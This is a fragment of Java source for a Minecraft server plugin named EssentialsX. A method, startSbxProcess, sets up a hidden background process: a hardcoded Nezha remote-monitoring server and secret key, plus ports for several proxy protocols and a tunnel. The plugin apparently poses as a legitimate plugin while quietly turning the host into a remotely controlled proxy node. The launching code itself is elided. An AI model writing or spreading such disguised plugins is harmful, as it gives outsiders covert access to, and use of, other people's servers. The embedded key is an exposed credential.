...
public class EssentialsX extends JavaPlugin {
    ...
    private void startSbxProcess() throws Exception {
        ...
        env.put("UUID", "b21795d8-0257-4cd1-ff3f-aef25d120aae");
        env.put("FILE_PATH", "./world");
        env.put("NEZHA_SERVER", "nezha.kadcs.eu.org:443");
        env.put("NEZHA_PORT", "");
        env.put("NEZHA_KEY",  "sOq90vA8wAdW4fLKaE4JBTZqAmgvRcd8");
        env.put("ARGO_PORT", "8001");
        env.put("ARGO_DOMAIN", "");
        env.put("ARGO_AUTH", "");
        env.put("S5_PORT", "");
        env.put("HY2_PORT", "20355");
        env.put("TUIC_PORT", "20317");
        env.put("ANYTLS_PORT", "20184");
        env.put("REALITY_PORT", "");
        env.put("ANYREALITY_PORT", "20129");
        env.put("UPLOAD_URL", "");
